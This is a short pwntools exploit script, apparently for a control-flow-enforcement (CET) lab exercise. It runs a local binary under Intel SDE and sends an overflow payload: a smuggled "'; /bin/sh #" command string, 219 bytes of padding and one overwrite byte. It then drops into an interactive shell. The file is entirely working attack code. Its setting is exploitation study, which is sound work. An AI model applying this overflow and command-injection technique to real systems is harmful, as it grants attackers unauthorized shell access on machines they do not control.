from pwn import *

context.arch = "amd64"


# target = process(
#     "./sdekit/sde64 -no-follow-child -cet -cet_output_file /dev/null -- ./bin/ex1",
#     shell=True,
# )


context.terminal = ["gnome-terminal", "--geometry=160x80", "-e"]
# io = gdb.debug(
#     "./bin/ex2",
#     """
#     b ex2.cpp:74
#     c
#     """,
# )
io = process(
    "./sdekit/sde64 -no-follow-child -cet -cet_output_file /dev/null -- ./bin/ex2",
    shell=True,
)


io.send(b"'; /bin/sh #\0" + 219 * b"A" + b"\x48")
io.interactive()
